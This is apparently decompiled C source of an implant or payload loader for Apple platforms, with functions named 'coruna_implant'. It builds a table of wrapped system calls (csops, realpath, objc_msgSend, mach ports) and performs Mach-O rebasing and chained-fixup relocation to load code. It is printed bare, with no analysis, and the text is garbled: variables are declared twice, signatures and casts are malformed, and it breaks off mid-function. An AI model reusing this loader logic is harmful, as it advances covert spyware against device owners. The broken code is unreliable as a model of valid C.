uint64_t coruna_implant65fc_via_identity_6080(uint8_t *buf)
{
  unsigned long u;
  bool err;
  int err;
  long handle;
  uint64_t size;
  uint8_t version;
  int status;
  uint8_t scratch;
  
  if (buf == (uint8_t *)0x0) {
    return 0xffffffff;
  }
  scratch = 0;
  handle = coruna_identity_6080(k_implant_get_cpu_capabilities_slot);
  u = *(unsigned long *)(handle + 0xc) & 0xffffffffffffff00;
  if (u == 0) {
    size = 0xfffffffe;
  }
  else {
    err = *(int *)(u + 0x80);
    if (err < 0x1b588bb3) {
      err = err == -0x789a1216;
      status = -0x25cc27c3;
    }
    else {
      err = err == 0x1b588bb3 || err == 0x462504d2;
      status = 0x2876f5b5;
    }
    version = 0;
    if ((err || err == status) && (err = coruna_cfstringcreatewithcstring(&scratch), version = scratch, err != 0)
       ) {
      size = 0xfffffffd;
    }
    else {
      size = 0;
      *buf = version;
    }
  }
  return size;
}





uint64_t
void coruna_implant65fc_via_ctx_free_18dac(uint64_t *val,short *arg,uint64_t id_2,short *arg,uint64_t size_3
            ,int flags)
{
  uint64_t *ptr;
  uint32_t *buf;
  uint64_t u;
  
  u = 0xad001;
  if (((val != (uint64_t *)0x0) &&
      ((arg == (short *)0x0 || ((*arg == 2 && (1 < (ushort)arg[1])))))) &&
     ((arg == (short *)0x0 || ((*arg == 1 && (arg[1] != 0)))))) {
    ptr = _calloc(1,0x20);
    if (ptr == (uint64_t *)0x0) {
      u = 0xad009;
    }
    else {
      ptr[1] = arg;
      ptr[2] = arg;
      u = coruna_resolve_libcache_sym(ptr,arg,id_2,size_3);
      if ((int)u == 0) {
        if ((flags == 0) || (u = coruna_implant65fc_via_csops_18e40(ptr), (int)u == 0)) {
          buf = _calloc(1,0x70);
          if (buf != (uint32_t *)0x0) {
            *buf = 0x10003;
            *(uint64_t **)(buf + 2) = ptr;
            *(void (**)(buf + 4) = coruna_ctx_free_c54c;
            *(void (**)(buf + 6) = coruna_implant65fc_via_implant65fc_via_csops_18e40;
            *(void (**)(buf + 8) = coruna_return_zero_c668;
            *(void (**)(buf + 10) = coruna_call_csops_12bb0;
            *(void (**)(buf + 0xc) = coruna_implant65fc_via_ctx_free_c9d4;
            *(void (**)(buf + 0xe) = coruna_call_realpath;
            *(void (**)(buf + 0x10) = coruna_call_objc_msgsend;
            *(void (**)(buf + 0x12) = coruna_call_mach_port_deallocate_19584;
            *(void (**)(buf + 0x14) = coruna_call_mach_port_deallocate_19110;
            *(void (**)(buf + 0x16) = coruna_call_mach_port_deallocate_1865c;
            *(void (**)(buf + 0x18) = coruna_call_realpath_c878;
            *(void (**)(buf + 0x1a) = coruna_loader_iface_get;
            *val = buf;
            return 0;
          }
          u = 0xad009;
          if (ptr[3] != 0) {
            coruna_ctx_free_18dac();
            ptr[3] = 0;
          }
        }
        coruna_ctx_free_129d0(*ptr);
        *ptr = 0;
      }
      _free(ptr);
    }
  }
  return u;
}





uint64_t coruna_implant65fc_via_csops_18e40(uint64_t *val)
{
  int err;
  uint64_t u;
  long *ptr;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    ptr = val + 3;
    if ((*ptr == 0) && (val[2] != 0)) {
      u = coruna_csops_18e40(ptr,val[2],*val,val[1]);
      err = (int)u;
      if ((err != 0) && ((err == 0x7003 || ((val[1] == 0 && (err == 0x1e037)))))) {
        u = 0;
        *ptr = 0;
      }
    }
    else {
      u = 0;
    }
  }
  return u;
}





uint64_t coruna_ctx_free_c54c(uint64_t *val)
{
  uint64_t u;
  uint64_t size;
  uint64_t *ptr;
  
  if (val == (uint64_t *)0x0) {
    return 0xad001;
  }
  ptr = (uint64_t *)val[1];
  if (ptr[3] == 0) {
    size = coruna_ctx_free_129d0(*ptr);
  }
  else {
    u = coruna_ctx_free_18dac();
    size = coruna_ctx_free_129d0(*ptr);
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    _free(ptr);
    val[0xb] = 0;
    val[10] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
    return u;
  }
  u = size;
fail:
  ptr[1] = 0;
  *ptr = 0;
  ptr[3] = 0;
  ptr[2] = 0;
  _free(ptr);
  val[0xb] = 0;
  val[10] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[7] = 0;
  val[6] = 0;
  val[9] = 0;
  val[8] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  _free(val);
  return u;
}





unsigned long coruna_implant65fc_via_implant65fc_via_csops_18e40(long arg,short *val)

{
  uint u;
  unsigned long size;
  uint64_t *copy;
  
  size = 0xad001;
  if ((((arg != 0) && (val != (short *)0x0)) && (*val == 2)) && (1 < (ushort)val[1])
     ) {
    copy = *(uint64_t **)(arg + 8);
    if ((short *)copy[1] == (short *)0x0) {
      size = coruna_implant65fc_residual_115(*copy,val);
      if ((int)size == 0) {
        copy[1] = val;
        size = coruna_implant65fc_via_csops_18e40(copy);
        if ((int)size != 0) {
          copy[1] = 0;
        }
      }
    }
    else {
      u = 0;
      if ((short *)copy[1] != val) {
        u = 0xad005;
      }
      size = (unsigned long)u;
    }
  }
  return size;
}





uint64_t coruna_return_zero_c668(long handle)
{
  uint64_t u;
  long handle;
  uint64_t size;
  uint64_t *ptr;
  long *ptr;
  
  size = 0xad001;
  if (handle == 0) {
    return 0xad001;
  }
  ptr = *(uint64_t **)(handle + 8);
  if (ptr[1] == 0) {
    return 0;
  }
  if (ptr[3] == 0) {
    ptr = (long *)*ptr;
    if (ptr != (long *)0x0) {
      handle = *ptr;
      if ((handle != 0) && ((char)ptr[2] != '\0')) {
        (**(void (**)(handle + 0x20))(handle,ptr[1]);
      }
      size = 0;
      *ptr = 0;
      ptr[1] = 0;
      *(uint8_t *)(ptr + 2) = 0;
    }
  }
  else {
    u = coruna_ctx_free_18dac();
    ptr[3] = 0;
    ptr = (long *)*ptr;
    if (ptr != (long *)0x0) {
      handle = *ptr;
      if ((handle != 0) && ((char)ptr[2] != '\0')) {
        (**(void (**)(handle + 0x20))(handle,ptr[1]);
      }
      size = 0;
      *ptr = 0;
      ptr[1] = 0;
      *(uint8_t *)(ptr + 2) = 0;
    }
    ptr[1] = 0;
    return u;
  }
  u = size;
fail:
  ptr[1] = 0;
  return u;
}





uint64_t coruna_call_csops_12bb0(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = coruna_csops_12bb0(**(uint64_t **)(handle + 8));
    return u;
  }
  return 0xad001;
}





uint64_t
void coruna_implant65fc_via_ctx_free_c9d4(long handle,long addr_2,uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  uint64_t u;
  uint64_t size;
  uint16_t *ptr;
  uint64_t version;
  uint64_t *buf;
  long scratch;
  
  version = 0xad001;
  if ((((handle != 0) && (addr_2 != 0)) && ((int)val != 0)) && (size_3 != (uint64_t *)0x0))
  {
    buf = *(uint64_t **)(handle + 8);
    ptr = _calloc(1,0x40);
    if (ptr == (uint16_t *)0x0) {
      version = 0xad009;
    }
    else {
      *ptr = 1;
      ((void (**)(void *, long, uint64_t))(ptr + 0x14))[0] = coruna_ctx_free_c9d4;
      ((void (**)(void *, long, uint64_t))(ptr + 0x18))[0] = coruna_implant65fc_residual_106;
      ((void (**)(void *, long, uint64_t))(ptr + 0x1c))[0] = coruna_implant65fc_residual_107;
      scratch = 0;
      version = coruna_implant65fc_via_parse_xnu_processors_13d28(*buf,addr_2,val,id_2,&scratch);
      if ((int)version == 0) {
        u = *(uint64_t *)(scratch + 8);
        size = *(uint64_t *)(scratch + 0x10);
        *(long *)(ptr + 4) = scratch;
        *(uint64_t *)(ptr + 8) = u;
        *(int *)(ptr + 0xc) = (int)size;
        *(uint64_t *)(ptr + 0x10) = *(uint64_t *)(scratch + 0x18);
        *size_3 = ptr;
      }
      else {
        coruna_ctx_free_c9d4(ptr);
      }
    }
  }
  return version;
}





unsigned long coruna_call_realpath(long arg,uint64_t val)

{
  uint u;
  unsigned long size;
  
  u = 0xad001;
  if (arg != 0) {
    if (*(long *)(*(long *)(arg + 8) + 0x18) != 0) {
      size = coruna_realpath(val,3);
      return size;
    }
    u = 0xad010;
  }
  return (unsigned long)u;
}





unsigned long coruna_call_realpath_c878(long arg,uint64_t val,uint64_t n,uint64_t m)

{
  uint u;
  unsigned long size;
  
  u = 0xad001;
  if (arg != 0) {
    if (*(long *)(*(long *)(arg + 8) + 0x18) != 0) {
      size = coruna_realpath(val,n,m);
      return size;
    }
    u = 0xad010;
  }
  return (unsigned long)u;
}





unsigned long coruna_call_objc_msgsend(long arg)

{
  uint u;
  unsigned long size;
  long off;
  
  u = 0xad001;
  if (arg != 0) {
    off = *(long *)(*(long *)(arg + 8) + 0x18);
    if (off != 0) {
      size = coruna_objc_msgsend(off);
      return size;
    }
    u = 0xad010;
  }
  return (unsigned long)u;
}





uint64_t coruna_call_mach_port_deallocate_19584(long handle)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if (handle != 0) {
    handle = *(long *)(*(long *)(handle + 8) + 0x18);
    if (handle == 0) {
      u = 0xad010;
    }
    else {
      u = coruna_mach_port_deallocate_19584(handle);
    }
  }
  return u;
}





uint64_t coruna_call_mach_port_deallocate_19110(long handle)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if (handle != 0) {
    handle = *(long *)(*(long *)(handle + 8) + 0x18);
    if (handle == 0) {
      u = 0xad010;
    }
    else {
      u = coruna_mach_port_deallocate_19110(handle);
    }
  }
  return u;
}





uint64_t coruna_call_mach_port_deallocate_1865c(long handle,uint64_t val,uint64_t id_2,long addr_2)
{
  uint64_t u;
  
  if ((((handle != 0) && ((int)val != 0)) && ((int)val != -1)) && (addr_2 != 0)) {
    u = coruna_mach_port_deallocate_1865c(val,id_2,0,addr_2,0);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_loader_iface_get(long handle)
{
  uint64_t u;
  long handle;
  
  u = 0;
  if (handle != 0) {
    if ((*(long **)(handle + 8) == (long *)0x0) || (handle = **(long **)(handle + 8), handle == 0))
    {
      return 0;
    }
    u = *(uint64_t *)(handle + 8);
  }
  return u;
}





uint64_t coruna_ctx_free_c9d4(uint64_t *val)
{
  uint64_t u;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    if (val[1] == 0) {
      u = 0;
    }
    else {
      u = coruna_implant65fc_via_ctx_free_11dc8_2();
    }
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    _free(val);
  }
  return u;
}





uint64_t coruna_implant65fc_residual_106(long handle,long addr_2,long off_3)
{
  uint64_t u;
  
  if ((((handle != 0) && (addr_2 != 0)) && (off_3 != 0)) && (*(long *)(handle + 8) != 0)) {
    u = coruna_implant65fc_residual_111();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant65fc_residual_107(long handle)
{
  uint64_t u;
  
  if ((handle != 0) && (*(long *)(handle + 8) != 0)) {
    u = coruna_implant65fc_via_macho_foreach_loadcmd_9();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant65fc_via_fixup_slide_base(long handle)
{
  uint *ptr;
  long *ptr;
  unsigned long *buf;
  unsigned long *str;
  unsigned long *copy;
  unsigned long *data;
  uint u;
  byte err;
  long handle;
  uint *obj;
  unsigned long *block;
  uint *entry;
  unsigned long size;
  int *err;
  int err;
  uint *entry_9;
  unsigned long version;
  uint port;
  unsigned long tag;
  int *status;
  uint kind;
  uint64_t type_id;
  long addr;
  long off;
  unsigned long type_id_8;
  long base;
  uint *entry_10;
  int *flags;
  long ctx_val;
  long serial;
  long scratch;
  
  if (handle == 0) {
    type_id = 0xad001;
  }
  else {
    ctx_val = *(long *)(handle + 0x120);
    if ((((ctx_val == 0) || (base = *(long *)(handle + 0x1b0), base == 0)) ||
        (entry_10 = *(uint **)(handle + 8), entry_10 == (uint *)0x0)) ||
       ((serial = *(long *)(handle + 0x10), serial == 0 ||
        (addr = *(long *)(handle + 0x170), addr == 0)))) {
      type_id = 0x930009;
    }
    else {
      type_id = 0x930009;
      if (*(long *)(handle + 0x1a8) != 0) {
        off = *(long *)(handle + 0x50);
        port = *(uint *)(base + 0x4c);
        handle = coruna_fixup_slide_base(handle);
        type_id = 0x930008;
        if (handle != 0) {
          if (port != 0) {
            obj = (uint *)(ctx_val + (unsigned long)*(uint *)(base + 0x48));
            if (obj < entry_10) {
              return 0x930003;
            }
            ptr = (uint *)(serial + (long)entry_10);
            if (ptr <= obj) {
              return 0x930003;
            }
            entry = obj + (unsigned long)port * 2;
            entry_9 = (uint *)((long)entry - 1);
            if (entry_9 < entry_10) {
              return 0x930003;
            }
            if (ptr <= entry_9) {
              return 0x930003;
            }
            do {
              port = *obj;
              tag = (unsigned long)port;
              if ((int)port < 0) {
                if ((~port & 0x30000000) != 0) {
                  return 0x930002;
                }
                if ((port & 0xf000000) != 0) {
                  return 0x930002;
                }
                tag = tag & 0xffffff;
fail:
                ptr = (long *)(handle + tag);
                if (ptr < *(long **)(handle + 8) ||
                    (long *)(*(long *)(handle + 0x10) + (long)*(long **)(handle + 8)) <= ptr) {
                  return 0x930001;
                }
                *ptr = *ptr + off;
              }
              else if ((obj[1] & 0xffffff) != 0) {
                if ((obj[1] & 0xf6000000) != 0x6000000) {
                  return 0x930002;
                }
                goto fail;
              }
              obj = obj + 2;
            } while (obj < entry);
            ctx_val = *(long *)(handle + 0x120);
            if (ctx_val == 0) {
              return 0x910012;
            }
            entry_10 = *(uint **)(handle + 8);
            if (entry_10 == (uint *)0x0) {
              return 0x910012;
            }
          }
          if (*(long *)(handle + 0x10) == 0) {
            type_id = 0x910012;
          }
          else {
            port = *(uint *)(base + 0x44);
            if (port != 0) {
              obj = (uint *)(ctx_val + (unsigned long)*(uint *)(base + 0x40));
              if (obj < entry_10) {
                return 0x91000a;
              }
              ptr = (uint *)(*(long *)(handle + 0x10) + (long)entry_10);
              if (ptr <= obj) {
                return 0x91000a;
              }
              entry = (uint *)((long)obj + (unsigned long)port * 8 + -1);
              if (entry < entry_10) {
                return 0x91000a;
              }
              if (ptr <= entry) {
                return 0x91000a;
              }
              u = *(uint *)(addr + 0x18);
              ctx_val = coruna_fixup_slide_base(handle);
              if (ctx_val == 0) {
                return 0x930008;
              }
              tag = 0;
              scratch = 0;
              block = (unsigned long *)0x0;
              do {
                if ((obj[tag * 2 + 1] & 0xf6000000) != 0x6000000) {
                  return 0x910002;
                }
                buf = (unsigned long *)(ctx_val + (int)obj[tag * 2]);
                data = *(unsigned long **)(handle + 8);
                str = (unsigned long *)(*(long *)(handle + 0x10) + (long)data);
                if (buf < data || str <= buf) {
                  return 0x910002;
                }
                base = *(long *)(handle + 0x1a8);
                version = (unsigned long)obj[tag * 2 + 1] & 0xffffff;
                copy = (unsigned long *)(base + version * 0x10);
                if (copy < data || str <= copy) {
                  return 0x910002;
                }
                size = *buf;
                type_id_8 = size;
                if ((u >> 4 & 1) != 0) {
                  serial = base + version * 0x10;
                  if (((~*(byte *)(serial + 4) & 0xe) == 0) &&
                     ((*(ushort *)(serial + 6) >> 7 & 1) != 0)) {
                    base = base + version * 0x10;
                    version = size - *(long *)(base + 8);
                    type_id_8 = version;
                    if (version != 0) {
                      err = *(int *)(*(long *)(handle + 0x170) + 0x10);
                      if (err == 0) {
done:
                        type_id_8 = 0;
                      }
                      else {
                        err = *(byte *)(base + 5);
                        status = (int *)(*(long *)(handle + 0x148) + 0x20);
                        kind = 1;
                        do {
                          if (*status == 0x19) {
                            if (((kind & 0xff) <= (uint)err) &&
                               ((uint)err < status[0x10] + (kind & 0xff))) {
                              err = (uint)err - (kind & 0xff);
                              if ((size < *(unsigned long *)(status + (long)err * 0x14 + 0x1a)) ||
                                 (type_id_8 = version,
                                 *(long *)(status + (long)err * 0x14 + 0x1c) +
                                 *(unsigned long *)(status + (long)err * 0x14 + 0x1a) <= size))
                              goto done;
                              break;
                            }
                            kind = kind + status[0x10];
                          }
                          status = (int *)((long)status + (unsigned long)(uint)status[1]);
                          err = err + -1;
                          type_id_8 = 0;
                        } while (err != 0);
                      }
                    }
                  }
                  else {
                    type_id_8 = size - *(long *)(serial + 8);
                  }
                }
                if ((copy != block) &&
                   (type_id = coruna_implant65fc_via_objc_empty_vtable_107b4(handle,copy,&scratch,0), (int)type_id != 0)) {
                  return type_id;
                }
                if (((u >> 4 & 1) == 0) || (*buf != scratch + type_id_8)) {
                  *buf = scratch + type_id_8;
                }
                tag = tag + 1;
                block = copy;
              } while (tag != port);
            }
            if ((((*(long *)(handle + 0x148) == 0) || (*(long *)(handle + 0x120) == 0)) ||
                (*(long *)(handle + 0x1b0) == 0)) ||
               ((*(long *)(handle + 8) == 0 || (*(long *)(handle + 0x10) == 0)))) {
              type_id = 0x910011;
            }
            else {
              type_id = 0x910011;
              if (*(long *)(handle + 0x1a8) != 0) {
                ctx_val = *(long *)(handle + 0x170);
                if (*(int *)(ctx_val + 0x10) == 0) {
                  type_id = 0;
                }
                else {
                  port = 0;
                  base = *(long *)(handle + 0x120) +
                           (unsigned long)*(uint *)(*(long *)(handle + 0x1b0) + 0x38);
                  serial = *(long *)(handle + 8) - *(long *)(handle + 0x168);
                  status = (int *)(*(long *)(handle + 0x148) + 0x20);
                  do {
                    if (*status == 0x19) {
                      flags = status + 0x12;
                      err = flags + (unsigned long)(uint)status[0x10] * 0x14;
                      if (flags < err) {
cleanup:
                        if ((flags[0x10] & 0xfeU) != 6 || *(unsigned long *)(flags + 10) < 8) {
                          type_id = 0;
check_ok:
                          flags = flags + 0x14;
                          if ((err <= flags) || ((int)type_id != 0)) goto skip;
                          goto cleanup;
                        }
                        u = flags[0x11];
                        tag = base + (unsigned long)u * 4;
                        type_id_8 = *(unsigned long *)(handle + 8);
                        version = *(long *)(handle + 0x10) + type_id_8;
                        if ((type_id_8 <= tag && tag < version) &&
                           (size = *(unsigned long *)(flags + 10) >> 3,
                           tag = (base + (size + u) * 4) - 4,
                           type_id_8 <= tag && tag < version)) {
                          tag = 0;
                          ctx_val = *(long *)(flags + 8) + serial;
                          do {
                            kind = *(uint *)(base + (unsigned long)(u + (int)tag) * 4);
                            if (kind == 0x40000000) {
                              type_id = 0;
                            }
                            else if (kind == 0x80000000) {
                              type_id = 0;
                              *(long *)(ctx_val + tag * 8) =
                                   *(long *)(ctx_val + tag * 8) + serial;
                            }
                            else {
                              version = *(long *)(handle + 0x1a8) + (unsigned long)kind * 0x10;
                              if (version < *(unsigned long *)(handle + 8) ||
                                  *(long *)(handle + 0x10) + *(unsigned long *)(handle + 8) <= version) {
                                type_id = 0x910004;
                                goto skip;
                              }
                              scratch = 0;
                              type_id = coruna_implant65fc_via_objc_empty_vtable_107b4(handle,version,&scratch,1);
                              if ((int)type_id == 0) {
                                *(long *)(ctx_val + tag * 8) = scratch;
                              }
                            }
                            tag = tag + 1;
                          } while (((tag & 0xffffffff) < size) && ((int)type_id == 0));
                          goto check_ok;
                        }
                        type_id = 0x910005;
skip:
                        ctx_val = *(long *)(handle + 0x170);
                      }
                      else {
                        type_id = 0;
                      }
                    }
                    else {
                      type_id = 0;
                    }
                    status = (int *)((long)status + (unsigned long)(uint)status[1]);
                    port = port + 1;
                  } while (port < *(uint *)(ctx_val + 0x10) && (int)type_id == 0);
                }
              }
            }
          }
        }
      }
    }
  }
  return type_id;
}





long coruna_fixup_slide_base(long handle)
{
  long handle;
  int *err;
  int err;
  
  if (handle == 0) {
fail:
    handle = 0;
  }
  else {
    err = (int *)(*(long *)(handle + 0x148) + 0x20);
    err = *(int *)(*(long *)(handle + 0x170) + 0x10) + 1;
    do {
      err = err + -1;
      if (err == 0) goto fail;
      if ((*err == 0x19) && ((*(byte *)(err + 0xf) >> 1 & 1) != 0)) {
        handle = *(long *)(handle + 0x18) + *(long *)(err + 6);
      }
      else {
        handle = 0;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
    } while (handle == 0);
  }
  return handle;
}





unsigned long coruna_implant65fc_via_objc_empty_vtable_107b4(long arg,uint *val,unsigned long *n,int m)

{
  uint u;
  ushort size;
  unsigned long type_id_8;
  unsigned long version;
  unsigned long cache_44;
  
  type_id_8 = 0xad001;
  u = 0x910003;
  if (m == 0) {
    u = 0x910001;
  }
  version = (unsigned long)u;
  if (((arg != 0) && (val != (uint *)0x0)) && (n != (unsigned long *)0x0)) {
    if (((~(byte)val[1] & 0xe) == 0) &&
       (size = *(ushort *)((long)val + 6),
       ((byte)val[1] & 0x10) != 0 || (size & 0x80) != 0)) {
      type_id_8 = *(long *)(arg + 8) + *(long *)(val + 2);
      *n = type_id_8;
      if ((size >> 3 & 1) == 0) {
        type_id_8 = 0;
      }
      else {
        *n = type_id_8 | 1;
        type_id_8 = 0;
      }
    }
    else {
      type_id_8 = version;
      if (*(long *)(arg + 0x1b8) != 0) {
        version = *(long *)(arg + 0x1b8) + (unsigned long)*val;
        if ((*(unsigned long *)(arg + 8) <= version) &&
           (version < *(long *)(arg + 0x10) + *(unsigned long *)(arg + 8))) {
          cache_44 = 0;
          version = coruna_objc_empty_vtable_107b4(arg,0,version,0,0,&cache_44);
          if (((int)version != 0x910006) && (type_id_8 = version, (int)version == 0)) {
            *n = cache_44;
          }
        }
      }
    }
  }
  return type_id_8;
}





uint64_t coruna_bzero_4(long handle)
{
  unsigned long *ptr;
  byte *ptr;
  long *buf;
  uint *buf;
  uint *str;
  uint *copy;
  uint *data;
  uint *obj;
  void (*ptr)(void);
  long *str;
  uint *block;
  byte err;
  short ls13;
  uint *entry;
  bool status;
  long *copy;
  uint64_t u;
  void *data;
  uint size;
  uint version;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  long handle;
  uint type_id;
  byte *obj;
  uint64_t type_id_8;
  unsigned long type_id_9;
  int err;
  long addr;
  long off;
  void *block;
  byte *entry;
  byte *entry_9;
  unsigned long type_id_10;
  long base;
  int status;
  unsigned long scratch;
  uint *bootargs;
  
  type_id_8 = 0xad001;
  if (handle == 0) {
    return 0xad001;
  }
  handle = *(long *)(handle + 0x188);
  if (handle != 0) {
    off = *(long *)(handle + 0x120);
    if (off == 0) {
      return 0xad001;
    }
    addr = *(long *)(handle + 0x40);
    base = *(long *)(handle + 0x168);
    size = *(uint *)(handle + 8);
    type_id = *(uint *)(handle + 0xc);
    copy = (long *)coruna_macho_seg19_offset(handle,0,0);
    if (copy == (long *)0x0) {
      return 0x930004;
    }
    if (type_id == 0) {
switchD_0000d264_caseD_0:
      ptr = coruna_implant65fc_via_objc_empty_vtable_107b4_2;
      if (*(char *)(handle + 0x138) != '\0') {
        ptr = coruna_implant65fc_residual_108;
      }
      type_id_8 = coruna_implant65fc_via_bzero_5(handle,ptr,0);
      if ((int)type_id_8 == 0) {
        if ((*(ushort *)(handle + 0x1c0) >> 7 & 1) == 0) {
          type_id_8 = coruna_implant65fc_via_bzero_5_2(handle,ptr,0);
          return type_id_8;
        }
        return 0;
      }
      return type_id_8;
    }
    addr = addr - base;
    entry_9 = (byte *)(off + (unsigned long)size);
    ptr = entry_9 + type_id;
    type_id_9 = 1;
fail:
    entry = entry_9 + 1;
    err = *entry_9 >> 4;
    if (8 < err) {
      return 0x930005;
    }
    port = (unsigned long)*entry_9 & 0xf;
    status = (int)type_id_9;
    err = (int)addr;
    type_id_10 = port;
    entry_9 = entry;
    switch(err) {
    case 0:
      break;
    case 1:
      break;
    case 2:
      copy = (long *)coruna_macho_seg19_offset(handle,port,0);
      if (copy == (long *)0x0) {
        return 0x930004;
      }
      port = 0;
      type_id_10 = 0;
      obj = entry;
      do {
        port = 0;
        entry_9 = entry;
        copy = (long *)(port + (long)copy);
        type_id_10 = type_id_9;
        entry_9 = obj + 1;
        err = *obj;
        kind = ((unsigned long)err & 0x7f) << (type_id_10 & 0x3f);
        if (0x3f < (uint)type_id_10) {
          kind = 0;
        }
        port = kind | port;
        type_id_10 = (unsigned long)((uint)type_id_10 + 7);
        obj = entry_9;
      } while ((char)err < '\0');
      copy = (long *)(port + (long)copy);
      type_id_10 = type_id_9;
    case 3:
      port = 0;
      type_id_10 = 0;
      obj = entry;
      do {
        port = 0;
        entry_9 = entry;
        copy = (long *)(port + (long)copy);
        type_id_10 = type_id_9;
        entry_9 = obj + 1;
        err = *obj;
        kind = ((unsigned long)err & 0x7f) << (type_id_10 & 0x3f);
        if (0x3f < (uint)type_id_10) {
          kind = 0;
        }
        port = kind | port;
        type_id_10 = (unsigned long)((uint)type_id_10 + 7);
        obj = entry_9;
      } while ((char)err < '\0');
      copy = (long *)(port + (long)copy);
      type_id_10 = type_id_9;
    case 4:
      copy = copy + port;
      type_id_10 = type_id_9;
      break;
    case 5:
      size = (uint)port;
      while (type_id_10 = type_id_9, size != 0) {
        str = *(long **)(handle + 8);
        buf = (long *)(*(long *)(handle + 0x10) + (long)str);
        if ((buf < str || copy < str) || buf <= copy) {
          return 0x930003;
        }
        if (status == 2) {
          *(int *)copy = (int)*copy + err;
        }
        else {
          if (status != 1) {
            return 0x930007;
          }
          *copy = *copy + addr;
        }
        copy = copy + 1;
        size = (int)port - 1;
        port = (unsigned long)size;
      }
      break;
    case 6:
      port = 0;
      kind = 0;
      obj = entry;
      do {
        type_id_10 = type_id_9;
        entry_9 = entry;
        break;
        entry_9 = obj + 1;
        err = *obj;
        type_id_10 = ((unsigned long)err & 0x7f) << (kind & 0x3f);
        if (0x3f < (uint)kind) {
          type_id_10 = 0;
        }
        port = type_id_10 | port;
        kind = (unsigned long)((uint)kind + 7);
        obj = entry_9;
      } while ((char)err < '\0');
      if (0xfffffffe < port) {
        return 0x930006;
      }
      type_id_10 = type_id_9;
      if (port != 0) {
        kind = 2;
        do {
          str = *(long **)(handle + 8);
          buf = (long *)(*(long *)(handle + 0x10) + (long)str);
          if ((buf < str || copy < str) || buf <= copy) {
            return 0x930003;
          }
          if (status == 2) {
            *(int *)copy = (int)*copy + err;
          }
          else {
            if (status != 1) {
              return 0x930007;
            }
            *copy = *copy + addr;
          }
          copy = copy + 1;
          status = kind <= port;
          kind = (unsigned long)((int)kind + 1);
        } while (status);
      }
      break;
    case 7:
      str = *(long **)(handle + 8);
      buf = (long *)(*(long *)(handle + 0x10) + (long)str);
      if ((buf < str || copy < str) || buf <= copy) {
        return 0x930003;
      }
      if (status == 2) {
        *(int *)copy = (int)*copy + err;
      }
      else {
        if (status != 1) {
          return 0x930007;
        }
        *copy = *copy + addr;
      }
      port = 0;
      type_id_10 = 0;
      obj = entry;
      do {
        if (ptr <= obj) {
          port = 0;
          entry_9 = entry;
          break;
        }
        entry_9 = obj + 1;
        err = *obj;
        kind = ((unsigned long)err & 0x7f) << (type_id_10 & 0x3f);
        if (0x3f < (uint)type_id_10) {
          kind = 0;
        }
        port = kind | port;
        type_id_10 = (unsigned long)((uint)type_id_10 + 7);
        obj = entry_9;
      } while ((char)err < '\0');
      copy = (long *)((long)copy + port + 8);
      type_id_10 = type_id_9;
      break;
    case 8:
      port = 0;
      type_id_10 = 0;
      do {
        if (ptr <= entry_9) {
          port = 0;
          obj = entry;
          break;
        }
        obj = entry_9 + 1;
        err = *entry_9;
        kind = ((unsigned long)err & 0x7f) << (type_id_10 & 0x3f);
        if (0x3f < (uint)type_id_10) {
          kind = 0;
        }
        port = kind | port;
        type_id_10 = (unsigned long)((uint)type_id_10 + 7);
        entry_9 = obj;
      } while ((char)err < '\0');
      kind = 0;
      type_id_10 = 0;
      entry = obj;
      do {
        if (ptr <= entry) {
          kind = 0;
          entry_9 = obj;
          break;
        }
        entry_9 = entry + 1;
        err = *entry;
        tag = ((unsigned long)err & 0x7f) << (type_id_10 & 0x3f);
        if (0x3f < (uint)type_id_10) {
          tag = 0;
        }
        kind = tag | kind;
        type_id_10 = (unsigned long)((uint)type_id_10 + 7);
        entry = entry_9;
      } while ((char)err < '\0');
      if (0xfffffffe < port) {
        return 0x930006;
      }
      type_id_10 = type_id_9;
      if (port != 0) {
        tag = 2;
        do {
          str = *(long **)(handle + 8);
          buf = (long *)(*(long *)(handle + 0x10) + (long)str);
          if ((buf < str || copy < str) || buf <= copy) {
            return 0x930003;
          }
          if (status == 2) {
            *(int *)copy = (int)*copy + err;
          }
          else {
            if (status != 1) {
              return 0x930007;
            }
            *copy = *copy + addr;
          }
          status = tag <= port;
          tag = (unsigned long)((int)tag + 1);
          copy = (long *)((long)copy + kind + 8);
        } while (status);
      }
    }
    break;
  }
  if (*(long *)(handle + 0x198) == 0) {
    return 0x910010;
  }
  bootargs = (uint *)0x0;
  u = coruna_block_dispose_fcd0(handle,*(uint32_t *)(*(long *)(handle + 0x198) + 8),&bootargs);
  entry = bootargs;
  if ((int)u != 0) {
    return u;
  }
  block = *(uint **)(handle + 8);
  buf = (uint *)(*(long *)(handle + 0x10) + (long)block);
  if (buf < block) {
    return 0x920006;
  }
  if (bootargs < block) {
    return 0x920006;
  }
  if (buf <= bootargs) {
    return 0x920006;
  }
  size = *(uint *)(*(long *)(handle + 0x198) + 0xc);
  str = (uint *)((unsigned long)size + (long)bootargs);
  if ((str < bootargs || str < block) || buf < str) {
    return 0x920006;
  }
  if (((*bootargs == 0) && (0x1b < bootargs[1])) && (bootargs[1] < size)) {
    type_id = bootargs[4];
    type_id_9 = (unsigned long)type_id;
    if (type_id == 0) {
      if (bootargs[6] != 0) {
        return 0x920003;
      }
      type_id_9 = 0;
      data = (void *)0x0;
joined_r0x0000d87c:
      bootargs = entry;
      if ((entry != (uint *)0x0) && (size != 0)) {
